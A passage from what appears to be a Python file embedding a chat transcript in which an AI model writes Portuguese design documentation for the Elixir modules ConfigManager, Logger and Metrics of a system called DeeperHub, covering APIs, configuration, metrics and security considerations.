*   **Retorno:**
    *   `{:ok, setting}`: A configuração que foi removida.
    *   `{:error, :not_found}`: Se a configuração não existir.
    *   `{:error, reason}`: Para outros erros.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case DeeperHub.Core.ConfigManager.delete(\"old_feature.enabled\", \"global\", deleted_by: \"cleanup_script\") do
      {:ok, _} -> Logger.info(\"Configuração removida.\")
      {:error, :not_found} -> Logger.warn(\"Configuração não encontrada para remoção.\")
      {:error, reason} -> Logger.error(\"Falha ao remover configuração: #{inspect(reason)}\")
    end
    ```

### 6.5. `DeeperHub.Core.ConfigManager.subscribe(event_key_pattern :: String.t(), subscriber :: pid() | module()) :: :ok | {:error, term()}`

*   **Descrição:** Permite que um processo ou módulo se inscreva para notificações de mudanças em configurações que correspondam ao `event_key_pattern`.
*   **`@spec`:** `subscribe(event_key_pattern :: String.t(), subscriber :: pid() | module()) :: :ok | {:error, term()}`
*   **Parâmetros:**
    *   `event_key_pattern`: Um padrão para as chaves de configuração (ex: `\"notifications.*\"`, `\"features.new_dashboard.enabled\"`).
    *   `subscriber`: O PID ou nome do módulo que receberá as mensagens `{:config_changed, key, scope, old_value, new_value}`.
*   **Retorno:** `:ok` ou `{:error, reason}`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    # Em um GenServer
    def init(_args) do
      DeeperHub.Core.ConfigManager.subscribe(\"notifications.smtp.*\", self())
      {:ok, load_smtp_config()}
    end

    def handle_info({:config_changed, key, _scope, _old_value, new_value}, state) do
      Logger.info(\"Configuração '#{key}' alterada para: #{inspect(new_value)}. Recarregando...\")
      new_smtp_config = load_smtp_config() # Função para recarregar
      {:noreply, %{state | smtp_config: new_smtp_config}}
    end
    ```

## ⚙️ 7. Configuração

O próprio `ConfigManager` carrega suas configurações iniciais de:
1.  Arquivos de configuração Elixir (ex: `config/runtime.exs`).
2.  Variáveis de ambiente (com um prefixo definido, ex: `DEEPERHUB_CORE_CONFIGMANAGER_`).
3.  Banco de dados (se o `EctoStorage` estiver configurado como uma fonte).

Configurações específicas do `ConfigManager`:
*   `[:core, :config_manager, :cache_ttl_seconds]` (Integer): TTL padrão para entradas de configuração no cache. (Padrão: `300` - 5 minutos)
*   `[:core, :config_manager, :sources]` (List): Lista de módulos adaptadores de storage a serem usados e sua ordem de precedência (ex: `[DeeperHub.Core.ConfigManager.Storage.EnvVarStorage, DeeperHub.Core.ConfigManager.Storage.EctoStorage, DeeperHub.Core.ConfigManager.Storage.FileStorage]`).
*   `[:core, :config_manager, :file_storage, :paths]` (List de Strings): Caminhos para arquivos de configuração adicionais se `FileStorage` for usado.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.EventBus`: Para notificar sobre mudanças de configuração.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para métricas de acesso ao cache e storage.
*   `DeeperHub.Core.Repo` (opcional): Se `EctoStorage` for usado.
*   `DeeperHub.Core.Supervisor` (indireta): Para ser supervisionado.

### 8.2. Bibliotecas Externas

*   `Ecto` (opcional): Se `EctoStorage` for usado.
*   `Jason` (opcional): Se `FileStorage` for usado com arquivos JSON.

## 🤝 9. Como Usar / Integração

A maioria dos módulos no sistema DeeperHub dependerá do `ConfigManager` para obter suas configurações.

**Obtendo uma configuração:**
```elixir
alias DeeperHub.Core.ConfigManager

# Obter com valor padrão
default_page_size = ConfigManager.get(\"myapp.pagination.default_size\", \"global\", 20)

# Obter usando lista de chaves (escopo global implícito)
api_url = ConfigManager.get_config([:services, :external_foo, :api_url])

if api_url do
  # ... usar api_url
else
  Logger.warn(\"URL da API externa Foo não configurada.\")
end
```

**Reagindo a mudanças (em um GenServer):**
```elixir
defmodule MyService do
  use GenServer
  alias DeeperHub.Core.ConfigManager
  alias DeeperHub.Core.Logger

  def start_link(opts) do
    GenServer.start_link(__MODULE__, opts, name: __MODULE__)
  end

  @impl true
  def init(_opts) do
    ConfigManager.subscribe(\"myservice.feature_x.enabled\", self())
    state = %{feature_x_enabled: ConfigManager.get(\"myservice.feature_x.enabled\", \"global\", false)}
    Logger.info(\"MyService iniciado, feature_x_enabled: #{state.feature_x_enabled}\")
    {:ok, state}
  end

  @impl true
  def handle_info({:config_changed, \"myservice.feature_x.enabled\", _scope, _old_value, new_value}, state) do
    Logger.info(\"Configuração de feature_x alterada para: #{new_value}. Atualizando estado.\")
    {:noreply, %{state | feature_x_enabled: new_value}}
  end

  def handle_info(_msg, state), do: {:noreply, state}

  # ... outras funções ...
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários para o `ConfigManager.Server`, `Cache`, e cada `StorageAdapter`.
*   Testes de integração para verificar o fluxo completo de obtenção e definição de configurações, incluindo invalidação de cache e publicação de eventos.
*   Localização dos testes: `test/deeper_hub/core/config_manager/`

### 10.2. Métricas

*   **Contadores:**
    *   `deeper_hub.core.config_manager.get.cache_hit.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.get.cache_miss.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.set.success.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.set.failure.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.delete.success.count` (tags: `key_prefix`)
*   **Histogramas/Timers:**
    *   `deeper_hub.core.config_manager.get.duration_ms` (tags: `source` (`:cache`, `:storage`))
    *   `deeper_hub.core.config_manager.set.duration_ms`
*   **Gauges:**
    *   `deeper_hub.core.config_manager.cache.size.gauge`

### 10.3. Logs

*   **Nível INFO:**
    *   Carregamento de configurações na inicialização (fontes, número de chaves).
    *   Atualizações de configuração bem-sucedidas (chave, escopo, quem alterou).
    *   Eventos de invalidação de cache.
*   **Nível WARNING:**
    *   Tentativa de obter uma configuração não existente que não possui valor padrão.
    *   Falha ao carregar configurações de uma fonte específica (ex: arquivo não encontrado).
*   **Nível ERROR:**
    *   Falha ao persistir uma configuração.
    *   Erro interno no `ConfigManager.Server`.

### 10.4. Telemetria

Eventos Telemetry são emitidos para:
*   `[:deeper_hub, :core, :config_manager, :get, :start | :stop | :exception]`
    *   Metadados: `%{key: key, scope: scope, source: :cache | :storage}`
*   `[:deeper_hub, :core, :config_manager, :set, :start | :stop | :exception]`
    *   Metadados: `%{key: key, scope: scope, created_by: user_id}`
*   `[:deeper_hub, :core, :config_manager, :cache, :invalidated]`
    *   Metadados: `%{key: key, scope: scope | :all}`

## ❌ 11. Tratamento de Erros

*   `get/3`: Retorna valor padrão se a chave não for encontrada.
*   `set/3`, `delete/3`: Retornam `{:error, changeset}` para erros de validação ou `{:error, reason}` para outros problemas de persistência ou internos.
*   Falhas ao carregar configurações de uma fonte na inicialização são logadas, mas o sistema pode continuar com as configurações de outras fontes ou padrões.

## 🛡️ 12. Considerações de Segurança

*   **Configurações Sensíveis:** O campo `:is_sensitive` no schema `Setting` deve ser usado para marcar chaves que contêm informações como senhas, API keys, etc.
*   **Acesso a Configurações Sensíveis:** A API `get/3` não deve retornar o valor real de configurações sensíveis, a menos que o chamador tenha privilégios específicos (a ser implementado, possivelmente com um contexto de chamada). Elas podem retornar um valor mascarado (ex: `\"[SENSITIVE]\"`) ou exigir uma função de acesso especial.
*   **Modificação de Configurações:** A API `set/3` e `delete/3` deve ser protegida. Idealmente, apenas processos administrativos ou de deploy devem ter permissão para modificar configurações globais. A opção `:created_by` ajuda na auditoria.
*   **Validação de Tipos:** Garantir que os valores das configurações correspondam ao `data_type` esperado ajuda a prevenir erros e comportamentos inesperados.

## 🧑‍💻 13. Contribuição

*   Novas configurações devem ter chaves bem definidas e descrições claras.
*   Considere o escopo apropriado para cada nova configuração.
*   Marque configurações sensíveis corretamente.
*   Adicione validações no `Setting.changeset/2` para novos tipos de dados ou restrições.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para gerenciamento de configurações.
*   [ ] Adicionar suporte a \"hot reloading\" de arquivos de configuração sem reinício do `ConfigManager`.
*   [ ] Integrar com um serviço de configuração externo (ex: HashiCorp Consul, etcd).
*   [ ] Melhorar a resolução de precedência entre diferentes `StorageAdapter`s (ex: variáveis de ambiente sempre sobrescrevem banco de dados, que sobrescreve arquivo).
*   [ ] Implementar controle de acesso mais granular para a modificação de configurações específicas.
*   [ ] Adicionar funcionalidade de \"histórico de versões\" para configurações, permitindo rollback.

---

*Última atualização: 2025-05-11*

---

Próximo! Qual módulo você gostaria de detalhar agora? Talvez `DeeperHub.Core.Logger` ou `DeeperHub.Auth`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar com o `DeeperHub.Core.Logger`, que é fundamental para a observabilidade do sistema.

---

# Módulo: `DeeperHub.Core.Logger` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.Logger`

O módulo `DeeperHub.Core.Logger` serve como a fachada centralizada e padronizada para todas as operações de logging dentro do sistema DeeperHub. Ele abstrai a implementação de logging subjacente (que pode ser o `Logger` padrão do Elixir, um backend customizado, ou integração com serviços externos como Logstash, Datadog, etc.), fornecendo uma API consistente para todos os módulos da aplicação.

Seu principal objetivo é garantir que os logs sejam estruturados, ricos em contexto, e facilmente pesquisáveis, facilitando a depuração, monitoramento e análise do comportamento do sistema. 😊

*(Nota: A documentação original mencionava `DeeperHub.Logger` e `DeeperHub.Core.LoggerFacade`, e também `DeeperHub.Core.Services.LoggerFacade`. Esta documentação consolida a ideia de uma única fachada principal `DeeperHub.Core.Logger` que delega para uma implementação mais robusta, como o `DeeperHub.Shared.Logging.StructuredLogger` mencionado.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Interface de Logging Unificada:**
    *   Fornecer funções para diferentes níveis de severidade: `debug/3`, `info/3`, `warn/3`, `error/3`, `critical/3` (e potencialmente `emergency/3`, `notice/3` como visto na documentação original).
    *   Aceitar uma mensagem e um mapa de metadados para logs estruturados.
*   **Enriquecimento Automático de Logs:**
    *   Adicionar automaticamente informações contextuais a cada log, como:
        *   Timestamp.
        *   Nível de severidade.
        *   Módulo de origem.
        *   Nome da função e aridade (opcional, via macro).
        *   PID do processo.
        *   ID de Correlação/Trace ID (se integrado com `DistributedTracing`).
*   **Suporte a Contexto de Logging:**
    *   Permitir que os módulos definam metadados de contexto que são automaticamente incluídos em todos os logs subsequentes dentro daquele processo ou escopo (via `DeeperHub.Shared.Logging.Context`).
*   **Formatação Estruturada:**
    *   Garantir que os logs sejam formatados de maneira consistente (ex: JSON) para facilitar a análise por ferramentas de logging.
*   **Configurabilidade de Backends:**
    *   Permitir a configuração de múltiplos backends de logging (console, arquivo, serviço externo) através do `DeeperHub.Core.ConfigManager`.
    *   Suportar diferentes níveis de log por backend.
*   **Sanitização de Dados Sensíveis (Integração):**
    *   Integrar com um serviço de sanitização (como `DeeperHub.Security.LogSanitizer`) para remover ou mascarar dados sensíveis dos logs antes da escrita.
*   **Integração com Métricas:**
    *   Opcionalmente, registrar métricas sobre o volume e tipos de logs gerados.
*   **Emojis Configuráveis (Nice-to-have):**
    *   Permitir a configuração de emojis para diferentes níveis de log para melhorar a legibilidade no console (via `DeeperHub.Logger.Config`).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Logger` (Fachada Pública):**
    *   **Responsabilidade:** É a API pública que todos os módulos usam para registrar logs.
    *   **Interações:**
        *   Coleta informações de contexto (módulo, função) automaticamente (potencialmente usando macros).
        *   Obtém o contexto de logging do processo (via `DeeperHub.Shared.Logging.Context`).
        *   Obtém o ID de correlação (via `DeeperHub.Shared.Logging.DistributedTracing`).
        *   Chama o `DeeperHub.Core.Logger.Adapter` para processar e enviar o log.
2.  **`DeeperHub.Core.Logger.Adapter` (Behaviour e Implementação Padrão):**
    *   **Responsabilidade:** Abstrair a lógica de processamento e envio de logs para os backends.
    *   **Comportamento (`LoggerBehaviour`):** Define a interface que os adaptadores devem implementar.
    *   **Implementação Padrão (`DefaultLoggerAdapter` ou `StructuredLoggerAdapter`):**
        *   Pode ser um GenServer para enfileirar logs e processá-los assincronamente (para evitar bloqueio).
        *   Formata a mensagem e os metadados em uma estrutura padronizada (ex: JSON).
        *   Integra com o `LogSanitizer` para remover dados sensíveis.
        *   Itera sobre os backends configurados e envia o log formatado para cada um que corresponda ao nível de severidade.
3.  **`DeeperHub.Shared.Logging.StructuredLogger` (GenServer, ex-`DeeperHub.Logger.StructuredLogger`):**
    *   **Responsabilidade:** Pode ser a implementação central do `DefaultLoggerAdapter`. Gerencia múltiplos backends de logging e despacha mensagens de log formatadas com contexto e metadados.
    *   **Estado Interno:** Lista de backends configurados, filtros por backend.
4.  **Backends de Logging (Exemplos):**
    *   `Logger.Backends.Console`: Backend padrão do Elixir para o console.
    *   `Logger.Backends.File`: Para escrever logs em arquivos.
    *   Adaptadores customizados para serviços como Datadog, Logstash, Sentry, etc.
5.  **`DeeperHub.Shared.Logging.Context`:**
    *   **Responsabilidade:** Gerenciar metadados de contexto por processo.
6.  **`DeeperHub.Logger.Config` (Opcional, para Emojis):**
    *   **Responsabilidade:** Gerenciar a configuração de emojis para níveis de log.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/logger/
├── logger.ex                     # Fachada Pública
├── adapter.ex                    # Behaviour e Default Adapter (ou StructuredLoggerAdapter)
│
├── backends/                     # (Opcional) Adaptadores customizados para backends
│   └── datadog_backend.ex
│
└── supervisor.ex                 # Supervisor para os processos do Logger (ex: StructuredLogger GenServer)

lib/deeper_hub/shared/logging/    # Módulos compartilhados de logging
├── structured_logger.ex          # Implementação central do GenServer de logging
├── context.ex
└── distributed_tracing.ex        # Se o trace_id for gerenciado aqui

lib/deeper_hub/logger/            # (Opcional) Se manter separação para Config de Emojis
├── config.ex                     # Configuração de Emojis
└── interface.ex                  # Interface simplificada (se necessária)
```

### 3.3. Decisões de Design Importantes

*   **Log Estruturado como Padrão:** Todos os logs devem ser estruturados (ex: JSON) para facilitar a consulta e análise por ferramentas automatizadas.
*   **Contexto é Rei:** Enriquecer logs com o máximo de contexto relevante (automático e manual) é crucial para depuração.
*   **Desempenho:** O logging não deve impactar significativamente o desempenho das operações principais. O processamento e envio para backends remotos deve ser assíncrono.
*   **Sanitização Obrigatória:** Dados sensíveis *nunca* devem vazar para os logs. A integração com um `LogSanitizer` é fundamental.
*   **Configurabilidade:** Níveis de log e backends devem ser facilmente configuráveis por ambiente e, idealmente, em tempo de execução para alguns casos.

## 🛠️ 4. Casos de Uso Principais

*   **Desenvolvedor Depura um Fluxo:** Um desenvolvedor usa `Logger.debug(\"Estado da variável X\", %{variable_x: data})` para inspecionar o estado durante a execução.
*   **Operação Concluída com Sucesso:** Um serviço registra `Logger.info(\"Pedido processado com sucesso\", %{order_id: 123, user_id: 456})`.
*   **Condição Inesperada mas Não Crítica:** O sistema detecta uma configuração opcional ausente e registra `Logger.warn(\"Configuração de cache não encontrada, usando padrão.\", %{cache_type: :local})`.
*   **Erro Tratado:** Uma API externa retorna um erro esperado, e o sistema registra `Logger.error(\"Falha ao buscar dados da API externa\", %{api: \"WeatherService\", error: \"timeout\", retry_attempt: 2})`.
*   **Falha Crítica:** O banco de dados fica indisponível. `Logger.critical(\"Conexão com banco de dados perdida!\", %{db_host: \"...\", error_details: e})`.

## 🌊 5. Fluxos Importantes

### Fluxo de Registro de Log

1.  **Módulo Chamador:** Chama uma função da fachada `DeeperHub.Core.Logger` (ex: `Logger.info(message, metadata)`).
    *   Macros podem capturar `__MODULE__`, `__ENV__.function`.
2.  **`DeeperHub.Core.Logger` (Fachada):**
    *   Obtém o contexto de `DeeperHub.Shared.Logging.Context.get_all()`.
    *   Obtém o `trace_id` de `DeeperHub.Shared.Logging.DistributedTracing.current_trace_id()`.
    *   Combina os metadados fornecidos, contexto automático e contexto do processo.
    *   Encaminha a mensagem, nível e metadados combinados para o `DeeperHub.Core.Logger.Adapter`.
3.  **`DeeperHub.Core.Logger.Adapter` (ex: `StructuredLoggerAdapter`):**
    *   Recebe os dados do log.
    *   (Opcional) Enfileira o log para processamento assíncrono se for um GenServer.
    *   Formata o log em uma estrutura padronizada (ex: JSON), incluindo timestamp, nível, mensagem, módulo, função, trace_id, e todos os metadados.
    *   **Chama o `LogSanitizer` para remover/mascarar dados sensíveis do log formatado.**
    *   Para cada backend de logging configurado:
        *   Verifica se o nível do log atual é igual ou superior ao nível configurado para o backend.
        *   Se sim, envia o log sanitizado e formatado para o backend.
4.  **Backend de Logging:**
    *   Escreve o log no destino (console, arquivo, serviço externo).

## 📡 6. API (Funções Públicas da Fachada)

As funções principais já foram vistas na documentação original (`debug/3`, `info/3`, `warn/3`, `error/3`, `critical/3`). A principal mudança é a adição de `module` como primeiro argumento ou a captura automática via macro, e metadados como último argumento.

### Exemplo de API Refinada (usando módulo como primeiro argumento):

```elixir
defmodule DeeperHub.Core.Logger do
  # ... (macros para capturar __ENV__.function, etc. podem estar aqui) ...

  defp call_adapter(level, module, message_or_fun, metadata) do
    # Lógica para obter contexto, trace_id, etc.
    # Lógica para avaliar message_or_fun se for uma função
    # ...
    # DeeperHub.Core.Logger.Adapter.log(level, full_context_map_with_message)
  end

  def debug(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:debug, module, message_or_fun, metadata)
  end

  def info(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:info, module, message_or_fun, metadata)
  end

  def warn(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:warn, module, message_or_fun, metadata)
  end

  def error(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:error, module, message_or_fun, metadata)
  end

  def critical(module, message_or_fun, metadata \\\\ %{}) do
    call_adapter(:critical, module, message_or_fun, metadata)
  end

  # Funções para gerenciar contexto (delegam para DeeperHub.Shared.Logging.Context)
  def set_context(metadata_map), do: DeeperHub.Shared.Logging.Context.put(metadata_map)
  def put_context(key, value), do: DeeperHub.Shared.Logging.Context.put(key, value)
  def get_context(), do: DeeperHub.Shared.Logging.Context.get_all()
  def clear_context(), do: DeeperHub.Shared.Logging.Context.clear()

  # Funções para gerenciar trace_id (delegam para DeeperHub.Shared.Logging.DistributedTracing)
  def start_trace(name, metadata \\\\ %{}), do: DeeperHub.Shared.Logging.DistributedTracing.start_trace(name, metadata)
  # ... outros ...
end
```

## ⚙️ 7. Configuração

Configurações gerenciadas pelo `DeeperHub.Core.ConfigManager`:

*   `[:core, :logger, :level]` (Atom): Nível de log global padrão (ex: `:info`). (Padrão: `:info` para prod, `:debug` para dev).
*   `[:core, :logger, :format]` (Atom): Formato de log padrão (:json, :text). (Padrão: `:json` para prod, `:text` para dev).
*   `[:core, :logger, :backends]` (List de Maps): Configuração dos backends de logging.
    Exemplo:
    ```elixir
    [
      %{
        name: :console,
        adapter: Logger.Backends.Console,
        level: :debug, # Nível específico para este backend
        format: :text, # Formato específico
        metadata: [:request_id, :user_id] # Metadados a incluir
      },
      %{
        name: :file,
        adapter: Logger.Backends.File,
        path: \"/var/log/deeper_hub/app.log\",
        level: :info,
        format: :json,
        rotation: %{size: 10_000_000, keep: 5} # Rotação de 10MB, manter 5 arquivos
      },
      %{
        name: :datadog,
        adapter: MyApp.DatadogLoggerBackend, # Adaptador customizado
        api_key: {:system, \"DATADOG_API_KEY\"},
        level: :warn
      }
    ]
    ```
*   `[:core, :logger, :sanitizer, :enabled]` (Boolean): Habilita/desabilita a sanitização de logs. (Padrão: `true`)
*   `[:core, :logger, :sanitizer, :sensitive_keys]` (List de Strings/Atoms): Lista de chaves a serem sanitizadas.
*   `[:core, :logger, :context, :auto_include_pid]` (Boolean): Inclui PID automaticamente. (Padrão: `true`)
*   `[:core, :logger, :context, :auto_include_trace_id]` (Boolean): Inclui Trace ID automaticamente. (Padrão: `true`)
*   (Opcional, se `DeeperHub.Logger.Config` for usado) `[:logger, :emojis, :info]` (String): Emoji para logs de info.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configurações de logging.
*   `DeeperHub.Shared.Logging.Context`: Para gerenciamento de contexto de log por processo.
*   `DeeperHub.Shared.Logging.DistributedTracing`: Para obter Trace IDs.
*   `DeeperHub.Security.LogSanitizer` (ou similar): Para sanitizar dados sensíveis.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar o `StructuredLogger` GenServer.

### 8.2. Bibliotecas Externas

*   `Logger` (Elixir Standard Library): Usado como base para a funcionalidade de logging.
*   `Jason` (ou similar): Se o formato de log JSON for o padrão.
*   Bibliotecas de clientes para serviços de logging externos (ex: `Dogstatsd` para Datadog), se aplicável.

## 🤝 9. Como Usar / Integração

**Registro Básico:**
```elixir
alias DeeperHub.Core.Logger

def my_function(user_id) do
  Logger.info(__MODULE__, \"Iniciando processamento para usuário.\", %{user_id: user_id})
  # ...
  Logger.debug(__MODULE__, \"Dados intermediários.\", %{data: some_data})
  # ...
  {:ok, \"resultado\"}
rescue
  e ->
    Logger.error(__MODULE__, \"Erro durante processamento.\", %{user_id: user_id, error: Exception.message(e), stacktrace: Exception.stacktrace(e)})
    {:error, :processing_failed}
end
```

**Usando Contexto de Log:**
```elixir
alias DeeperHub.Core.Logger

def handle_request(conn, params) do
  request_id = conn.private[:request_id] # Exemplo de como obter um request_id
  Logger.set_context(%{request_id: request_id, user_id: conn.assigns.current_user_id})

  process_data(params) # Logger.info dentro de process_data incluirá request_id e user_id

  Logger.clear_context() # Limpar contexto ao final da requisição
  conn
end

defp process_data(params) do
  Logger.info(__MODULE__, \"Processando dados do formulário.\", %{form_params: params})
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar se os logs são formatados corretamente para diferentes níveis e com metadados.
*   Verificar se a sanitização de dados sensíveis está funcionando.
*   Testar a configuração e o direcionamento para diferentes backends.
*   Testar a funcionalidade de contexto de log.
*   Localização: `test/deeper_hub/core/logger/` e `test/deeper_hub/shared/logging/`.

### 10.2. Métricas

*   `deeper_hub.core.logger.logs_written.count` (tags: `level`, `backend_name`): Número de logs escritos.
*   `deeper_hub.core.logger.log_processing.duration_ms` (Histograma, tags: `backend_name`): Tempo para processar e enviar um log para um backend.
*   `deeper_hub.core.logger.logs_sanitized.count` (Contador): Número de logs que passaram pela sanitização.
*   `deeper_hub.core.logger.logs_dropped.count` (tags: `reason`, `backend_name`): Número de logs descartados (ex: devido a nível de log do backend).

### 10.3. Logs (do próprio Logger)

O sistema de logging em si também deve gerar logs sobre sua operação, especialmente em níveis mais altos:
*   **Nível INFO:** Inicialização do Logger, configuração de backends, rotação de arquivos de log.
*   **Nível WARNING:** Falha temporária ao escrever em um backend (com retentativa).
*   **Nível ERROR:** Falha persistente ao escrever em um backend, erro de configuração de backend, falha na sanitização.

### 10.4. Telemetria

Eventos Telemetry podem ser emitidos para:
*   `[:deeper_hub, :core, :logger, :log_processed, :start | :stop | :exception]`
    *   Metadados: `%{level: level, backend: backend_name, message_size: size, metadata_keys: keys}`

## ❌ 11. Tratamento de Erros

*   **Falha de Backend:** Se um backend de logging falhar (ex: serviço externo indisponível), o `Logger.Adapter` deve tratar o erro graciosamente, registrar a falha (possivelmente usando outro backend mais confiável como o console) e continuar tentando enviar para outros backends configurados. Não deve travar o processo chamador.
*   **Erro de Formatação/Sanitização:** Erros internos na formatação ou sanitização devem ser capturados, logados (de forma segura) e não devem impedir o fluxo da aplicação.

## 🛡️ 12. Considerações de Segurança

*   **Sanitização é Crucial:** A integração com o `LogSanitizer` é a principal medida de segurança para evitar vazamento de dados sensíveis.
*   **Níveis de Log em Produção:** O nível de log global e dos backends deve ser configurado apropriadamente para produção (geralmente `:info` ou `:warn`) para evitar excesso de logs e exposição de dados de debug.
*   **Acesso aos Logs:** Arquivos de log e plataformas de logging centralizado devem ter controle de acesso rigoroso.
*   **Não Logar Informação Desnecessária:** Evitar logar objetos completos ou estruturas de dados grandes se apenas algumas informações são relevantes.

## 🧑‍💻 13. Contribuição

*   Sempre use a fachada `DeeperHub.Core.Logger` para registrar logs.
*   Forneça metadados ricos e estruturados.
*   Use o nível de log apropriado para a mensagem.
*   Tenha cuidado para não logar dados sensíveis diretamente; confie na sanitização, mas seja consciente.
*   Para fluxos complexos, utilize `Logger.set_context/1` para enriquecer todos os logs dentro daquele fluxo com identificadores comuns.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar amostragem de logs de debug/info em produção para reduzir volume, mas ainda capturar informações úteis.
*   [ ] Adicionar a capacidade de alterar níveis de log de backends específicos em tempo de execução via `ConfigManager`.
*   [ ] Desenvolver mais `LogBackends` customizados para integrações populares (ex: ELK Stack, Splunk).
*   [ ] Permitir filtros mais avançados nos backends (ex: logar apenas certos módulos para um backend específico).
*   [ ] Melhorar a performance do processamento assíncrono de logs sob alta carga.

---

*Última atualização: 2025-05-11*

---

Próximo? Talvez `DeeperHub.Auth` ou `DeeperHub.Core.Metrics`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Combinado! Vamos agora detalhar o `DeeperHub.Core.Metrics`, outro pilar da observabilidade.

---

# Módulo: `DeeperHub.Core.Metrics` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.Metrics`

O módulo `DeeperHub.Core.Metrics` é a fachada centralizada para a coleta, registro e exposição de métricas de desempenho e saúde do sistema DeeperHub. Ele fornece uma API unificada para que todos os outros módulos possam registrar métricas de forma consistente, abstraindo a implementação do backend de métricas (ex: Prometheus, StatsD, InfluxDB, ou um coletor ETS interno).

O objetivo principal é fornecer dados quantitativos sobre o comportamento da aplicação, permitindo monitoramento em tempo real, alertas sobre anomalias, análise de tendências de desempenho e otimização de recursos. 😊

*(Nota: A documentação original menciona `DeeperHub.Core.MetricsFacade` e `DeeperHub.Shared.Metrics.MetricsFacade`. Esta documentação consolida em `DeeperHub.Core.Metrics` como a fachada principal, que delegaria para uma implementação mais robusta como `DeeperHub.Shared.Metrics.Services.EtsMetricsService` ou um adaptador para um sistema externo.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Interface de Registro de Métricas Unificada:**
    *   Fornecer funções para diferentes tipos de métricas:
        *   **Contadores (`increment/3`, `decrement/3`):** Para valores que só aumentam ou diminuem (ex: número de requisições, erros).
        *   **Gauges (`gauge/3`):** Para valores que podem subir e descer arbitrariamente (ex: número de usuários ativos, uso de memória).
        *   **Histogramas/Distribuições (`histogram/3`, `record_timing/3`):** Para rastrear a distribuição estatística de um conjunto de valores (ex: latência de requisições, tamanho de payloads).
        *   **Timers (`start_timer/2`, `stop_timer/1` ou função wrapper):** Para medir a duração de operações.
*   **Suporte a Tags/Labels:**
    *   Permitir a adição de tags (pares chave-valor) às métricas para segmentação e filtragem (ex: `endpoint=\"/users\"`, `status_code=\"200\"`).
*   **Nomeação Consistente de Métricas:**
    *   Promover ou impor um esquema de nomeação hierárquico para métricas (ex: `deeper_hub.http.requests.duration_ms`).
*   **Abstração de Backend:**
    *   Delegar o armazenamento e a exposição real das métricas para um adaptador configurável, permitindo a integração com diferentes sistemas de monitoramento.
*   **Coleta Automática de Métricas do Sistema (Opcional):**
    *   Integrar com um `SystemMonitor` para coletar automaticamente métricas básicas do sistema (CPU, memória, etc.).
*   **Agregação e Sumarização (Básica):**
    *   Fornecer funcionalidades para obter resumos ou valores atuais de métricas (principalmente para backends em memória como ETS ou para dashboards de depuração).
*   **Exportação de Métricas (via Adaptador):**
    *   Permitir que os adaptadores exponham as métricas em formatos padronizados (ex: formato Prometheus).
*   **Alertas Baseados em Métricas (Integração):**
    *   Fornecer os dados para um sistema de alertas (`DeeperHub.Shared.Metrics.AlertsSystem`) que monitora métricas e dispara alertas quando limiares são cruzados.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Metrics` (Fachada Pública):**
    *   **Responsabilidade:** Ponto de entrada para todos os módulos registrarem métricas.
    *   **Interações:** Formata nomes de métricas e tags, e delega para o `DeeperHub.Core.Metrics.Adapter`.
2.  **`DeeperHub.Core.Metrics.Adapter` (Behaviour e Implementação Padrão):**
    *   **Responsabilidade:** Abstrair a lógica de interação com o backend de métricas.
    *   **Comportamento (`MetricsBehaviour`):** Define a interface que os adaptadores devem implementar.
    *   **Implementação Padrão (`DefaultMetricsAdapter` que usa `DeeperHub.Shared.Metrics.Services.EtsMetricsService` ou similar):**
        *   Recebe as chamadas da fachada.
        *   Interage com o sistema de armazenamento de métricas (ex: ETS, ou um cliente para Prometheus/StatsD).
        *   Pode envolver um GenServer para operações assíncronas ou agregação em lote, dependendo do backend.
3.  **`DeeperHub.Shared.Metrics.Services.EtsMetricsService` (Exemplo de Backend em Memória):**
    *   **Responsabilidade:** Armazenar e agregar métricas em tabelas ETS.
    *   **Componentes Internos (como visto na documentação original):**
        *   `EtsMetricsCounter`: Para contadores.
        *   `EtsMetricsHistogram`: Para gauges e histogramas.
4.  **`DeeperHub.Shared.Metrics.ModuleMetrics`:**
    *   **Responsabilidade:** Coletar métricas específicas de diferentes módulos do sistema (ex: número de usuários ativos do módulo `Accounts`). Pode ser chamado por um `CollectorWorker`.
5.  **`DeeperHub.Shared.Metrics.CollectorWorker` (GenServer):**
    *   **Responsabilidade:** Executar tarefas de coleta de métricas periodicamente (ex: chamar `ModuleMetrics.collect_all_module_metrics`).
6.  **`DeeperHub.Shared.Metrics.AlertsSystem` (GenServer):**
    *   **Responsabilidade:** Monitorar métricas contra limiares definidos e gerenciar alertas.
7.  **`DeeperHub.Shared.Metrics.ApiExporter`:**
